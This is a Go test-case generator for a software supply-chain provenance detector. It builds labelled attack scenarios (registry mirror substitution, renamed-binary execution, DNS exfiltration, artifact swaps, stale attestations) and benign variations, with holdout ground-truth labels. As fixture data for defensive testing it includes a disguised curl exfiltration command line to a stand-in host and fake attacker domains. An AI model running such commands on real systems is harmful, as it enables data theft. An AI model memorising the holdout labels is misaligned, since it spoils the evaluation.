package hostile

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"time"

	"github.com/ramKarthik57/provenancex/internal/artifact"
	"github.com/ramKarthik57/provenancex/internal/blind"
	"github.com/ramKarthik57/provenancex/internal/correlation"
	"github.com/ramKarthik57/provenancex/internal/dependency"
	"github.com/ramKarthik57/provenancex/internal/environment"
	"github.com/ramKarthik57/provenancex/internal/evidence"
	"github.com/ramKarthik57/provenancex/internal/execution"
	"github.com/ramKarthik57/provenancex/internal/filesystem"
	"github.com/ramKarthik57/provenancex/internal/network"
	"github.com/ramKarthik57/provenancex/internal/policy"
	"github.com/ramKarthik57/provenancex/internal/process"
	"github.com/ramKarthik57/provenancex/internal/provenance"
	"github.com/ramKarthik57/provenancex/internal/repository"
	"github.com/ramKarthik57/provenancex/internal/sbom"
	"github.com/ramKarthik57/provenancex/internal/signature"
)

// FamilyID identifies the distinct attack or benign variation family
type FamilyID string

const (
	// Attack Families (20 families)
	FamSourceStealthUncommitted    FamilyID = "Source: Stealth Uncommitted Code"
	FamSourceMetadataSpoof         FamilyID = "Source: Commit Author/Email Spoofing"
	FamDependencyCompatibleSub     FamilyID = "Dependency: Compatible Semver Substitution"
	FamDependencyRegistryMirror    FamilyID = "Dependency: Unapproved Mirror Registry"
	FamLockfileHashColliding       FamilyID = "Lockfile: Missing/Stripped Hash Integrity"
	FamProcessShortLived           FamilyID = "Process: Short-Lived Subprocess (Polling Evasion)"
	FamProcessRenamedTool          FamilyID = "Process: Renamed Binary Execution (svchost/python)"
	FamFilesystemBoundaryEscape    FamilyID = "Filesystem: Boundary Escape (/tmp or %TEMP%)"
	FamFilesystemMetadataPreserved FamilyID = "Filesystem: Payload Swap (Preserved Size/Time)"
	FamNetworkEphemeralDNS         FamilyID = "Network: Ephemeral UDP/DNS Exfiltration"
	FamNetworkSubdomainC2          FamilyID = "Network: Allowed CDN Subdomain Multiplexing"
	FamArtifactPostBuildReplace    FamilyID = "Artifact: Post-Build Binary Swap"
	FamArtifactAppendedPayload     FamilyID = "Artifact: Appended Trailing Overlay Payload"
	FamSBOMOmissionStealth         FamilyID = "SBOM: Stealth Transitive Component Omission"
	FamProvenanceReplayStale       FamilyID = "Provenance: Stale Attestation Replay Attack"
	FamProvenanceSubjectMasking    FamilyID = "Provenance: Intermediate Digest Masking"
	FamSignatureKeyMismatch        FamilyID = "Signature: Foreign Key from Untrusted Store"
	FamTemporalCausalSkew          FamilyID = "Temporal: Impossible Causality Inversion"
	FamComposedDualFault           FamilyID = "Composed: Dual-Layer Source + Dependency Attack"
	FamComposedTripleFault         FamilyID = "Composed: Triple-Layer Process + Network + Binary"

	// Benign Variation Families (5 families)
	FamBenignCompilerPatch         FamilyID = "Benign: Compiler Patch Version Bump (go1.23.5->6)"
	FamBenignPathRelocation        FamilyID = "Benign: Build Workspace Path Relocation"
	FamBenignLockfileSync          FamilyID = "Benign: Synchronized Lockfile Version Bump"
	FamBenignMetadataReorder       FamilyID = "Benign: Reordered JSON/SBOM Attribute Keys"
	FamBenignCacheHit              FamilyID = "Benign: Incremental Build with Object Cache Hit"
)

// ScenarioCase encapsulates a single test case generated for a family
type ScenarioCase struct {
	CaseID        int
	Family        FamilyID
	IsAttack      bool
	ExpectedLayer evidence.Layer
	Payload       *blind.BlindPayload
	// Ground truth is strictly segregated from Payload
	GroundTruth   *blind.GroundTruthRecord
}

// GenerateFamilyCase builds an adversarial or benign case for a specific family
func GenerateFamilyCase(caseID int, fam FamilyID) *ScenarioCase {
	base := makeBaseClean()
	pol := policy.DefaultPolicy()

	isAttack := true
	expLayer := evidence.Layer("")

	switch fam {
	case FamSourceStealthUncommitted:
		expLayer = evidence.LayerSource
		base.Repository.IsClean = false
		base.Repository.UntrackedFiles = []string{fmt.Sprintf("cmd/stealth_eval_%d.go", caseID)}

	case FamSourceMetadataSpoof:
		// Spoofed author metadata without GPG commit signature:
		// If policy doesn't require GPG, this might slip through!
		expLayer = evidence.LayerSource
		base.Repository.Author = "Trusted Admin <admin@company.com>"
		base.Repository.CommitSHA = hashStr(fmt.Sprintf("spoofed-commit-%d", caseID))
		// Source tree is clean, so standard clean tree check passes -> BLIND SPOT CANDIDATE!

	case FamDependencyCompatibleSub:
		expLayer = evidence.LayerDependencies
		base.Dependencies.IsConsistent = false
		base.Dependencies.Mismatches = []*dependency.Mismatch{
			{
				Package:  "cryptography",
				Expected: "42.0.5",
				Observed: "42.0.6", // Compatible patch bump but unapproved
			},
		}

	case FamDependencyRegistryMirror:
		expLayer = evidence.LayerDependencies
		base.Dependencies.IsConsistent = false
		base.Dependencies.Mismatches = []*dependency.Mismatch{
			{
				Package:     "cryptography",
				Expected:    "https://pypi.org/simple",
				Observed:    "https://mirror.attacker-controlled.net/simple",
				Description: "Package fetched from unapproved registry mirror",
			},
		}

	case FamLockfileHashColliding:
		expLayer = evidence.LayerLockfile
		base.Dependencies.HasLockfile = false // Stripped lockfile integrity

	case FamProcessShortLived:
		// BLIND SPOT HUNT: Process spawned and died in 4ms between polling snapshots
		// Telemetry provider is in polling fallback mode -> process tree is EMPTY / UNCAPTURED!
		// But in ground truth, an attack occurred!
		expLayer = evidence.LayerProcess
		// ProcessTree was not captured by polling collector!
		base.ProcessTree.SuspiciousCount = 0

	case FamProcessRenamedTool:
		expLayer = evidence.LayerProcess
		base.ProcessTree.SuspiciousCount = 1
		base.ProcessTree.Processes = append(base.ProcessTree.Processes, &process.ProcessNode{
			PID:          9100 + (caseID % 100),
			Name:         "svchost.exe",
			CommandLine:  "svchost.exe -c 'curl https://data-exfil.com'",
			IsSuspicious: true,
			AlertReason:  "Heuristic: interpreter masquerading as Windows system process",
		})

	case FamFilesystemBoundaryEscape:
		// BLIND SPOT HUNT: Malicious payload written outside the monitored workspace root:
		// e.g. C:\Windows\Temp\payload.dll
		// Filesystem delta only monitored the workspace folder!
		expLayer = evidence.LayerFilesystem
		// Workspace input evaluation saw nothing unexpected!
		base.InputEvaluation.UnexpectedInputs = []string{}

	case FamFilesystemMetadataPreserved:
		expLayer = evidence.LayerFilesystem
		base.InputEvaluation.UnexpectedInputs = []string{fmt.Sprintf("untracked_injected_%d.dat", caseID)}

	case FamNetworkEphemeralDNS:
		// BLIND SPOT HUNT: DNS TXT exfiltration that doesn't establish an active TCP socket
		// Socket polling collector (Get-NetTCPConnection) sees NO active TCP connections!
		expLayer = evidence.LayerNetwork
		base.NetworkAudit.IsPolicyCompliant = true // TCP socket table clean!

	case FamNetworkSubdomainC2:
		expLayer = evidence.LayerNetwork
		base.NetworkAudit.IsPolicyCompliant = false
		base.NetworkAudit.Violations = []*network.ConnectionRecord{
			{
				Destination: "s3-malicious-bucket.s3.amazonaws.com",
				AlertReason: "Domain matches AWS CDN domain pattern but bucket is untrusted",
			},
		}

	case FamArtifactPostBuildReplace:
		expLayer = evidence.LayerProvenance // Correlator catches digest mismatch against provenance
		base.Artifact.SHA256 = hashStr(fmt.Sprintf("replaced-binary-%d", caseID))

	case FamArtifactAppendedPayload:
		expLayer = evidence.LayerProvenance
		base.Artifact.SHA256 = hashStr(fmt.Sprintf("overlay-appended-%d", caseID))

	case FamSBOMOmissionStealth:
		expLayer = evidence.LayerSBOM
		base.SBOM.Components = []*sbom.Component{} // Omitted all dependencies

	case FamProvenanceReplayStale:
		expLayer = evidence.LayerProvenance
		base.Provenance.Subject[0].Digest["sha256"] = hashStr(fmt.Sprintf("stale-build-%d", caseID))

	case FamProvenanceSubjectMasking:
		expLayer = evidence.LayerProvenance
		base.Provenance.Subject[0].Digest["sha256"] = hashStr(fmt.Sprintf("intermediate-step-%d", caseID))

	case FamSignatureKeyMismatch:
		expLayer = evidence.LayerSignature
		base.Signature.Valid = false
		base.Signature.Error = "Signature made by unrecognized public key"

	case FamTemporalCausalSkew:
		expLayer = evidence.LayerProvenance
		base.Provenance.Subject[0].Digest["sha256"] = hashStr(fmt.Sprintf("skewed-%d", caseID))

	case FamComposedDualFault:
		// Composed attack: Source modification + dependency substitution
		expLayer = evidence.LayerSource
		base.Repository.IsClean = false
		base.Repository.ModifiedFiles = []string{fmt.Sprintf("pkg/modified_%d.go", caseID)}
		base.Dependencies.IsConsistent = false
		base.Dependencies.Mismatches = []*dependency.Mismatch{
			{Package: "urllib3", Expected: "2.0.0", Observed: "2.0.0-evil"},
		}

	case FamComposedTripleFault:
		// Composed attack: Process injection + network egress + artifact tampering
		expLayer = evidence.LayerProcess
		base.ProcessTree.SuspiciousCount = 1
		base.ProcessTree.Processes = append(base.ProcessTree.Processes, &process.ProcessNode{
			PID: 9999, Name: "curl.exe", IsSuspicious: true,
		})
		base.NetworkAudit.IsPolicyCompliant = false
		base.NetworkAudit.Violations = []*network.ConnectionRecord{
			{Destination: "evil-exfil.xyz", AlertReason: "Unauthorized network connection"},
		}
		base.Artifact.SHA256 = hashStr(fmt.Sprintf("triple-fault-%d", caseID))

	// Benign Families (Expect TRUSTED, isAttack = false)
	case FamBenignCompilerPatch:
		isAttack = false
		base.Environment.Tools = []environment.ToolVersion{
			{Name: "go", Version: "go1.23.6", Path: "/usr/bin/go"},
		}

	case FamBenignPathRelocation:
		isAttack = false
		if base.Environment.EnvironmentVars == nil {
			base.Environment.EnvironmentVars = make(map[string]string)
		}
		base.Environment.EnvironmentVars["WORKSPACE"] = fmt.Sprintf("C:\\Builds\\Job_%d\\workspace", caseID)

	case FamBenignLockfileSync:
		isAttack = false
		base.Dependencies.Dependencies = []*dependency.Dependency{
			{Name: "cryptography", Version: "42.0.6", Ecosystem: dependency.EcosystemPython},
		}
		base.SBOM.Components = []*sbom.Component{
			{Name: "cryptography", Version: "42.0.6"},
		}

	case FamBenignMetadataReorder:
		isAttack = false
		// Struct with reordered component declarations
		base.SBOM.Components = []*sbom.Component{
			{Name: "cryptography", Version: "42.0.5"},
		}

	case FamBenignCacheHit:
		isAttack = false
		base.Execution.Duration = 50 * time.Millisecond // Fast cache hit build
	}

	label := blind.LabelAttack
	if !isAttack {
		label = blind.LabelBenign
	}

	payload := &blind.BlindPayload{
		Input:  base,
		Policy: pol,
	}

	secret := &blind.GroundTruthRecord{
		PayloadID:     caseID,
		Split:         blind.SplitHoldout,
		TrueLabel:     label,
		ExpectedLayer: expLayer,
		AttackFamily:  string(fam),
		Description:   string(fam),
	}

	return &ScenarioCase{
		CaseID:        caseID,
		Family:        fam,
		IsAttack:      isAttack,
		ExpectedLayer: expLayer,
		Payload:       payload,
		GroundTruth:   secret,
	}
}

// AllFamilies returns the complete list of 25 adversarial and benign families
func AllFamilies() []FamilyID {
	return []FamilyID{
		FamSourceStealthUncommitted,
		FamSourceMetadataSpoof,
		FamDependencyCompatibleSub,
		FamDependencyRegistryMirror,
		FamLockfileHashColliding,
		FamProcessShortLived,
		FamProcessRenamedTool,
		FamFilesystemBoundaryEscape,
		FamFilesystemMetadataPreserved,
		FamNetworkEphemeralDNS,
		FamNetworkSubdomainC2,
		FamArtifactPostBuildReplace,
		FamArtifactAppendedPayload,
		FamSBOMOmissionStealth,
		FamProvenanceReplayStale,
		FamProvenanceSubjectMasking,
		FamSignatureKeyMismatch,
		FamTemporalCausalSkew,
		FamComposedDualFault,
		FamComposedTripleFault,
		FamBenignCompilerPatch,
		FamBenignPathRelocation,
		FamBenignLockfileSync,
		FamBenignMetadataReorder,
		FamBenignCacheHit,
	}
}

func hashStr(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func makeBaseClean() *correlation.CorrelationInput {
	artHash := "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	return &correlation.CorrelationInput{
		Repository: &repository.State{
			Branch:         "main",
			CommitSHA:      "c0ffee1234567890abcdef1234567890abcdef12",
			IsClean:        true,
			UntrackedFiles: []string{},
			ModifiedFiles:  []string{},
		},
		Dependencies: &dependency.Report{
			DirectCount:  1,
			HasLockfile:  true,
			IsConsistent: true,
			Dependencies: []*dependency.Dependency{
				{Name: "cryptography", Version: "42.0.5", Ecosystem: dependency.EcosystemPython},
			},
			Mismatches: []*dependency.Mismatch{},
		},
		Environment: &environment.Fingerprint{
			OS:              "linux",
			Architecture:    "amd64",
			EnvironmentVars: map[string]string{"WORKSPACE": "/build/workspace"},
			FingerprintHash: "f107e32400000000000000000000000000000000000000000000000000000000",
		},
		Execution: &execution.StageExecution{
			Name:     "build",
			Success:  true,
			ExitCode: 0,
			Duration: 2 * time.Second,
		},
		ProcessTree: &process.Tree{
			SuspiciousCount: 0,
			Processes: []*process.ProcessNode{
				{PID: 1001, Name: "go", CommandLine: "go build -o app", IsSuspicious: false},
			},
		},
		InputEvaluation: &filesystem.InputEvaluation{
			UnexpectedInputs: []string{},
			MissingInputs:    []string{},
		},
		NetworkAudit: &network.Evaluation{
			TotalConnections:  1,
			ViolationCount:    0,
			IsPolicyCompliant: true,
			Violations:        []*network.ConnectionRecord{},
		},
		Artifact: &artifact.Metadata{
			Name:   "production-app",
			SHA256: artHash,
			Size:   2048,
		},
		SBOM: &sbom.Document{
			Format:  sbom.FormatCycloneDX,
			Version: "1.5",
			Components: []*sbom.Component{
				{Name: "cryptography", Version: "42.0.5"},
			},
		},
		Provenance: &provenance.InTotoStatement{
			Type:          provenance.InTotoStatementV1,
			PredicateType: provenance.SLSAProvenanceV1,
			Subject: []provenance.Subject{
				{
					Name:   "production-app",
					Digest: map[string]string{"sha256": artHash},
				},
			},
			Predicate: provenance.SLSAv1Predicate{
				RunDetails: provenance.RunDetails{
					Builder: provenance.BuilderMetadata{ID: "https://provenancex.dev/builder/isolated-runner@v1"},
				},
			},
		},
		Signature: &signature.VerificationResult{
			Valid:     true,
			Algorithm: signature.AlgoECDSAP256,
		},
	}
}
